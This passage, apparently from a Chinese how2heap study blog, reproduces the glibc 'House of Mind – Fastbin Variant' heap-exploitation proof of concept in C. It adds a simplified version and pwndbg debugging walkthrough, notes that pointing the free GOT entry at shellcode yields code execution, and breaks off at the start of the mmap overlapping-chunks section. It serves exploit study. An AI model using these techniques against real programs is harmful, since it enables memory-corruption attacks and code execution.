class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">House of Mind - Fastbin Variant</span></span><br><span class="line"><span class="comment">==========================</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This attack is similar to the original 'House of Mind' in that it uses</span></span><br><span class="line"><span class="comment">a fake non-main arena in order to write to a new location. This</span></span><br><span class="line"><span class="comment">uses the fastbin for a WRITE-WHERE primitive in the 'fastbin'</span></span><br><span class="line"><span class="comment">variant of the original attack though. The original write for this</span></span><br><span class="line"><span class="comment">can be found at https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt with a more recent post (by me) at https://maxwelldulin.com/BlogPost?post=2257705984. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">By being able to allocate an arbitrary amount of chunks, a single byte</span></span><br><span class="line"><span class="comment">overwrite on a chunk size and a memory leak, we can control a super</span></span><br><span class="line"><span class="comment">powerful primitive. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This could be used in order to write a freed pointer to an arbitrary</span></span><br><span class="line"><span class="comment">location (which seems more useful). Or, this could be used as a</span></span><br><span class="line"><span class="comment">write-large-value-WHERE primitive (similar to unsortedbin attack). </span></span><br><span class="line"><span class="comment"> Both are interesting in their own right though but the first</span></span><br><span class="line"><span class="comment">option is the most powerful primitive, given the right setting.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Malloc chunks have a specified size and this size information</span></span><br><span class="line"><span class="comment">special metadata properties (prev_inuse, mmap chunk and non-main arena). </span></span><br><span class="line"><span class="comment">The usage of non-main arenas is the focus of this exploit. For more information </span></span><br><span class="line"><span class="comment">on this, read https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">First, we need to understand HOW the non-main arena is known from a chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This the 'heap_info' struct: </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">struct _heap_info</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  mstate ar_ptr;           // Arena for this heap. &lt;--- Malloc State pointer</span></span><br><span class="line"><span class="comment">  struct _heap_info *prev; // Previous heap.</span></span><br><span class="line"><span class="comment">  size_t size;            // Current size in bytes.</span></span><br><span class="line"><span class="comment">  size_t mprotect_size;   // Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">  char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; // Proper alignment</span></span><br><span class="line"><span class="comment">&#125; heap_info; </span></span><br><span class="line"><span class="comment">- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L48</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The important thing to note is that the 'malloc_state' within</span></span><br><span class="line"><span class="comment">an arena is grabbed from the ar_ptr, which is the FIRST entry </span></span><br><span class="line"><span class="comment">of this. Malloc_state == mstate == arena </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The main arena has a special pointer. However, non-main arenas (mstate)</span></span><br><span class="line"><span class="comment">are at the beginning of a heap section. They are grabbed with the </span></span><br><span class="line"><span class="comment">following code below, where the user controls the 'ptr' in 'arena_for_chunk':</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#define heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="comment">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br><span class="line"><span class="comment">#define arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="comment">  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br><span class="line"><span class="comment">- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L127</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This macro takes the 'ptr' and subtracts a large value because the </span></span><br><span class="line"><span class="comment">'heap_info' should be at the beginning of this heap section. Then, </span></span><br><span class="line"><span class="comment">using this, it can find the 'arena' to use. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The idea behind the attack is to use a fake arena to write pointers </span></span><br><span class="line"><span class="comment">to locations where they should not go but abusing the 'arena_for_chunk' </span></span><br><span class="line"><span class="comment">functionality when freeing a fastbin chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This POC does the following things: </span></span><br><span class="line"><span class="comment">- Finds a valid arena location for a non-main arena.</span></span><br><span class="line"><span class="comment">- Allocates enough heap chunks to get to the non-main arena location where </span></span><br><span class="line"><span class="comment">  we can control the values of the arena data. </span></span><br><span class="line"><span class="comment">- Creates a fake 'heap_info' in order to specify the 'ar_ptr' to be used as the arena later.</span></span><br><span class="line"><span class="comment">- Using this fake arena (ar_ptr), we can use the fastbin to write</span></span><br><span class="line"><span class="comment">  to an unexpected location of the 'ar_ptr' with a heap pointer. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Requirements: </span></span><br><span class="line"><span class="comment">- A heap leak in order to know where the fake 'heap_info' is located at.</span></span><br><span class="line"><span class="comment">	- Could be possible to avoid with special spraying techniques</span></span><br><span class="line"><span class="comment">- An unlimited amount of allocations</span></span><br><span class="line"><span class="comment">- A single byte overflow on the size of a chunk</span></span><br><span class="line"><span class="comment">	- NEEDS to be possible to put into the fastbin. </span></span><br><span class="line"><span class="comment">	- So, either NO tcache or the tcache needs to be filled. </span></span><br><span class="line"><span class="comment">- The location of the malloc state(ar_ptr) needs to have a value larger</span></span><br><span class="line"><span class="comment">  than the fastbin size being freed at malloc_state.system_mem otherwise</span></span><br><span class="line"><span class="comment">  the chunk will be assumed to be invalid.</span></span><br><span class="line"><span class="comment">	- This can be manually inserted or CAREFULLY done by lining up</span></span><br><span class="line"><span class="comment">	  values in a proper way. </span></span><br><span class="line"><span class="comment">- The NEXT chunk, from the one that is being freed, must be a valid size</span></span><br><span class="line"><span class="comment">(again, greater than 0x20 and less than malloc_state.system_mem)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Random perks:</span></span><br><span class="line"><span class="comment">- Can be done MULTIPLE times at the location, with different sized fastbin</span></span><br><span class="line"><span class="comment">  chunks. </span></span><br><span class="line"><span class="comment">- Does not brick malloc, unlike the unsorted bin attack. </span></span><br><span class="line"><span class="comment">- Only has three requirements: Infinite allocations, single byte buffer overflowand a heap memory leak. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">************************************</span></span><br><span class="line"><span class="comment">Written up by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">************************************</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"House of Mind - Fastbin Variant\n"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"=================================="</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The goal of this technique is to create a fake arena\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"at an offset of HEAP_MAX_SIZE\n"</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Then, we write to the fastbins when the chunk is freed\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This creates a somewhat constrained WRITE-WHERE primitive\n"</span>);</span><br><span class="line">	<span class="comment">// Values for the allocation information.	</span></span><br><span class="line">	<span class="keyword">int</span> HEAP_MAX_SIZE = <span class="number">0x4000000</span>;</span><br><span class="line">	<span class="keyword">int</span> MAX_SIZE = (<span class="number">128</span>*<span class="number">1024</span>) - <span class="number">0x100</span>; <span class="comment">// MMap threshold: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L635</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Find initial location of the heap\n"</span>);</span><br><span class="line">	<span class="comment">// The target location of our attack and the fake arena to use</span></span><br><span class="line">	<span class="keyword">uint8_t</span>* fake_arena = <span class="built_in">malloc</span>(<span class="number">0x1000</span>); </span><br><span class="line">	<span class="keyword">uint8_t</span>* target_loc = fake_arena + <span class="number">0x30</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint8_t</span>* target_chunk = (<span class="keyword">uint8_t</span>*) fake_arena - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Prepare a valid 'malloc_state' (arena) 'system_mem' </span></span><br><span class="line"><span class="comment">	to store a fastbin. This is important because the size</span></span><br><span class="line"><span class="comment">	of a chunk is validated for being too small or too large</span></span><br><span class="line"><span class="comment">	via the 'system_mem' of the 'malloc_state'. This just needs</span></span><br><span class="line"><span class="comment">	to be a value larger than our fastbin chunk.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Set 'system_mem' (offset 0x888) for fake arena\n"</span>);</span><br><span class="line">	fake_arena[<span class="number">0x888</span>] = <span class="number">0xFF</span>;</span><br><span class="line">	fake_arena[<span class="number">0x889</span>] = <span class="number">0xFF</span>; </span><br><span class="line">	fake_arena[<span class="number">0x88a</span>] = <span class="number">0xFF</span>; </span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Target Memory Address for overwrite: %p\n"</span>, target_loc);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Must set data at HEAP_MAX_SIZE (0x%x) offset\n"</span>, HEAP_MAX_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Calculate the location of our fake arena</span></span><br><span class="line">	<span class="keyword">uint64_t</span> new_arena_value = (((<span class="keyword">uint64_t</span>) target_chunk) + HEAP_MAX_SIZE) &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">uint64_t</span>* fake_heap_info = (<span class="keyword">uint64_t</span>*) new_arena_value;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span>* user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fake Heap Info struct location: %p\n"</span>, fake_heap_info);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Allocate until we reach a MAX_HEAP_SIZE offset\n"</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	The fake arena must be at a particular offset on the heap.</span></span><br><span class="line"><span class="comment">	So, we allocate a bunch of chunks until our next chunk</span></span><br><span class="line"><span class="comment">	will be in the arena. This value was calculated above.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">while</span>((<span class="keyword">long</span> <span class="keyword">long</span>)user_mem &lt; new_arena_value)&#123;</span><br><span class="line">		user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use this later to trigger craziness</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Create fastbin sized chunk to be victim of attack\n"</span>);</span><br><span class="line">	<span class="keyword">uint64_t</span>* fastbin_chunk = <span class="built_in">malloc</span>(<span class="number">0x50</span>); <span class="comment">// Size of 0x60</span></span><br><span class="line">	<span class="keyword">uint64_t</span>* chunk_ptr = fastbin_chunk - <span class="number">2</span>; <span class="comment">// Point to chunk instead of mem</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fastbin Chunk to overwrite: %p\n"</span>, fastbin_chunk);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fill up the TCache so that the fastbin will be used\n"</span>);</span><br><span class="line">	<span class="comment">// Fill the tcache to make the fastbin to be used later. </span></span><br><span class="line">	<span class="keyword">uint64_t</span>* tcache_chunks[<span class="number">7</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)&#123;</span><br><span class="line">		tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)&#123;</span><br><span class="line">		<span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Create a FAKE malloc_state pointer for the heap_state</span></span><br><span class="line"><span class="comment">	This is the 'ar_ptr' of the 'heap_info' struct shown above. </span></span><br><span class="line"><span class="comment">	This is the first entry in the 'heap_info' struct at offset 0x0</span></span><br><span class="line"><span class="comment">	 at the heap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	We set this to the location where we want to write a value to.</span></span><br><span class="line"><span class="comment">	The location that gets written to depends on the fastbin chunk</span></span><br><span class="line"><span class="comment">	size being freed. This will be between an offset of 0x8 and 0x40</span></span><br><span class="line"><span class="comment">	bytes. For instance, a chunk with a size of 0x20 would be in the</span></span><br><span class="line"><span class="comment">	0th index of fastbinsY struct. When this is written to, we will</span></span><br><span class="line"><span class="comment">	write to an offset of 8 from the original value written.</span></span><br><span class="line"><span class="comment">	- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1686</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Setting 'ar_ptr' (our fake arena)  in heap_info struct to %p\n"</span>, fake_arena);</span><br><span class="line">	fake_heap_info[<span class="number">0</span>] = (<span class="keyword">uint64_t</span>) fake_arena; <span class="comment">// Setting the fake ar_ptr (arena)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Target Write at %p prior to exploitation: 0x%x\n"</span>, target_loc, *(target_loc));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Set the non-main arena bit on the size. </span></span><br><span class="line"><span class="comment">	Additionally, we keep the size the same as the original</span></span><br><span class="line"><span class="comment">	allocation because there is a sanity check on the fastbin (when freeing)</span></span><br><span class="line"><span class="comment">	that the next chunk has a valid size. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	When grabbing the non-main arena, it will use our choosen arena!</span></span><br><span class="line"><span class="comment">	From there, it will write to the fastbin because of the size of the</span></span><br><span class="line"><span class="comment">	chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	///// Vulnerability! Overwriting the chunk size </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Set non-main arena bit on the fastbin chunk\n"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"NOTE: This keeps the next chunk size valid because the actual chunk size was never changed\n"</span>);</span><br><span class="line">	chunk_ptr[<span class="number">1</span>] = <span class="number">0x60</span> | <span class="number">0x4</span>; <span class="comment">// Setting the non-main arena bit</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//// End vulnerability </span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The offset being written to with the fastbin chunk address</span></span><br><span class="line"><span class="comment">	depends on the fastbin BEING used and the malloc_state itself. </span></span><br><span class="line"><span class="comment">	In 2.31, the offset from the beginning of the malloc_state</span></span><br><span class="line"><span class="comment">	to the fastbinsY array is 0x10. Then, fastbinsY[0x4] is an </span></span><br><span class="line"><span class="comment">	additional byte offset of 0x20. In total, the writing offset</span></span><br><span class="line"><span class="comment">	from the arena location is 0x30 bytes.</span></span><br><span class="line"><span class="comment">	from the arena location to where the write actually occurs. </span></span><br><span class="line"><span class="comment">	This is a similar concept to bk - 0x10 from the unsorted</span></span><br><span class="line"><span class="comment">	bin attack. </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"When we free the fastbin chunk with the non-main arena bit\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"set, it will cause our fake 'heap_info' struct to be used.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This will dereference our fake arena location and write\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"the address of the heap to an offset of the arena pointer.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Trigger the magic by freeing the chunk!\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(fastbin_chunk); <span class="comment">// Trigger the madness</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// For this particular fastbin chunk size, the offset is 0x28. </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Target Write at %p: 0x%llx\n"</span>, target_loc, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>*) (target_loc)));</span><br><span class="line">	assert(*((<span class="keyword">unsigned</span> <span class="keyword">long</span> *) (target_loc)) != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>简化版本：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> *fake_arena = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	fake_arena[<span class="number">0x888</span>/<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = <span class="number">0xffffff</span>;  <span class="comment">//system_mem offset 0x888</span></span><br><span class="line">	<span class="keyword">size_t</span>* fake_heap_info = (<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span>)(fake_arena<span class="number">-0x10</span>+<span class="number">0x4000000</span>) &amp; ~(<span class="number">0x4000000</span><span class="number">-1</span>));</span><br><span class="line">	<span class="keyword">size_t</span>* user_mem = <span class="built_in">malloc</span>(<span class="number">127</span>*<span class="number">1024</span>); <span class="comment">//line:4294 sysmalloc</span></span><br><span class="line">	<span class="keyword">while</span>(user_mem &lt; fake_heap_info) &#123;user_mem = <span class="built_in">malloc</span>(<span class="number">127</span>*<span class="number">1024</span>);&#125;;</span><br><span class="line">	fake_heap_info[<span class="number">0</span>] = (<span class="keyword">size_t</span>) fake_arena; <span class="comment">// Setting the fake ar_ptr</span></span><br><span class="line">	<span class="keyword">size_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x8</span>);</span><br><span class="line">	victim[<span class="number">-1</span>] = <span class="number">0x20</span> | <span class="number">0x4</span>; <span class="comment">// Setting the non-main arena bit</span></span><br><span class="line">	<span class="keyword">size_t</span>* x[<span class="number">7</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) x[i] = <span class="built_in">malloc</span>(<span class="number">0x8</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) <span class="built_in">free</span>(x[i]);</span><br><span class="line">	<span class="built_in">free</span>(victim);</span><br><span class="line">	<span class="keyword">size_t</span>* target = (<span class="keyword">size_t</span>*)((<span class="keyword">long</span>)fake_arena + <span class="number">0x10</span>);</span><br><span class="line">	assert( *target != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="pwndbg调试-11"><a href="#pwndbg调试-11" class="headerlink" title="pwndbg调试"></a>pwndbg调试</h3><p>申请一块4kb的内存作为 fake_arena，并设置 system_mem 字段为 0xffffff，这个system_mem的偏移是arena+0x888。<br>伪造的 fake arena 还需要一个heap_info结构体来存放 arena_ptr。原理中提到过，一个 thread_arena 在初始化的时候会分配64M的内存，其中可读写区域为132kb。<br><code>64*1024*1024=67108864=0x4000000</code><br>heap_info结构体地址的计算宏，与 HEAP_MAX_SIZE 的倍数对齐。这点很重要，因为我们的 victim chunk 在寻找 heap_info 的时候就是根据对齐的地址来的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> heap_for_ptr(ptr) ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br></pre></td></tr></table></figure></p>
<p>接下来就是一直申请堆块来提升 brk，扩充 main_arena直到将top chunk的地址提升至 fake_heap_info 之上。这里申请<code>127*1024</code>是因为当申请<code>128*1024</code>的话就会调用mmap()函数从mmap映射区域分配内存，这不是我们需要的地址。<br>然后将 fake_heap_info 的 arena_ptr 指针指向 fake_arena。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> p/x fake_heap_info[0]</span><br><span class="line"><span class="meta">$</span>3 = 0x5555557572a0</span><br></pre></td></tr></table></figure></p>
<p>再申请一个小的 chunk_victim，并将其non_main_arena bit位设置为1。方法还是那么巧妙，学到了：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim[<span class="number">-1</span>] = <span class="number">0x20</span> | <span class="number">0x4</span>;</span><br></pre></td></tr></table></figure></p>
<p>chunk_victim 的地址：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x55557402e510 (size : 0xaf0) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p victim</span><br><span class="line"><span class="meta">$</span>5 = (size_t *) 0x55557402e500</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p fake_arena</span><br><span class="line"><span class="meta">$</span>6 = (size_t *) 0x5555557572a0</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p fake_heap_info</span><br><span class="line"><span class="meta">$</span>7 = (size_t *) 0x555574000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p user_mem</span><br><span class="line"><span class="meta">$</span>8 = (size_t *) 0x55557400e8f0</span><br></pre></td></tr></table></figure></p>
<p>由于已经提升 top chunk 至heap_info之上，所以申请的 chunk_victim会从顶部的top_chunk中切割出一块。<br>然后填充tcache bin。<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/mind_arptr.png" alt><br>free(victim)的时候，由于修改了non_main_arena位，会调用<code>heap_for_ptr (ptr)-&gt;ar_ptr)</code>来寻找 fake_heap_info-&gt;ar_ptr，也就是fake_arena。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> info macro arena_for_chunk</span><br><span class="line">Defined at /home/pukrquq/Downloads/glibc-2.34/malloc/arena.c:131</span><br><span class="line">  included at /home/pukrquq/Downloads/glibc-2.34/malloc/malloc.c:2013</span><br><span class="line"><span class="meta">#</span>define arena_for_chunk(ptr) (chunk_main_arena (ptr) ? &amp;main_arena : heap_for_ptr (ptr)-&gt;ar_ptr)</span><br><span class="line"><span class="meta">pwndbg&gt;</span> info macro heap_for_ptr</span><br><span class="line">Defined at /home/pukrquq/Downloads/glibc-2.34/malloc/arena.c:129</span><br><span class="line">  included at /home/pukrquq/Downloads/glibc-2.34/malloc/malloc.c:2013</span><br><span class="line"><span class="meta">#</span>define heap_for_ptr(ptr) ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p/x ~(HEAP_MAX_SIZE - 1)</span><br><span class="line"><span class="meta">$</span>14 = 0xfc000000</span><br></pre></td></tr></table></figure>
<p><code>0x55557400e8f0 &amp; 0xfc000000 = 0x555574000000</code>也就是 fake_heap_info 的地址，<code>fake_heap_info-&gt;ar_ptr = fake_heap_info[0] = fake_arena</code>。<br>最终chunk_victim会存入fastbinsY数组，也就是<code>&amp;fake_arena+0x10</code>的地方。示意图如下：<br><img src="/2022/04/18/how2heap深入浅出学习堆利用/mind_fastbin.png" alt><br>如果将free的GOT表项修改为 shellcode 的地址，那么最终就会执行 shellcode。</p>
<h2 id="mmap-overlapping-chunks-glibc2-34"><a href="#mmap-overlapping-chunks-glibc2-34" class="headerlink" title="mmap_overlapping_chunks_glibc2.34"></a>mmap_overlapping_chunks_glibc2.34</h2><p>到最后一篇了！再次感谢野摩托的大力支持。</p>
<h3 id="原理-14"><a href="#原理-14" class="headerlink" title="原理"></a>原理</h3><p>这个的原理很简单。通过overlap获取一块可以修改的内存，从而将这里面的地址修改为目标地址。但是要明确一些知识点。<br>申请<code>0x100000</code>这么大的内存，已经不是在普通的 Heap 段了，而是通过<code>sysmalloc</code>函数分配到了mmap映射段。mmap 映射段在64位系统中自高地址向低地址增长，mmap chunk分配起始值是<code>mp_.mmap_threshold</code> ，随着上一次free mmap chunk动态变化，取最大值，尽量减少mmap数量。<br>mmap chunks的 prev_size 位不再是下一个 chunk 的大小，而是本 chunk 中没有使用的部分的大小。因为mmap分配的 chunk 都需要按页对齐，也造成了许多不必要的空间浪费。mmap chunks 的fd、bk指针也没有使用，因为他们不会进入bins中，而是直接归还系统。<br>在 mmap 映射段中同样也包含了 libc 的映射。libc？这样就有得玩了。</p>
<h3 id="POC-14"><a href="#POC-14" class="headerlink" title="POC"></a>POC</h3><p>how2heap POC<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 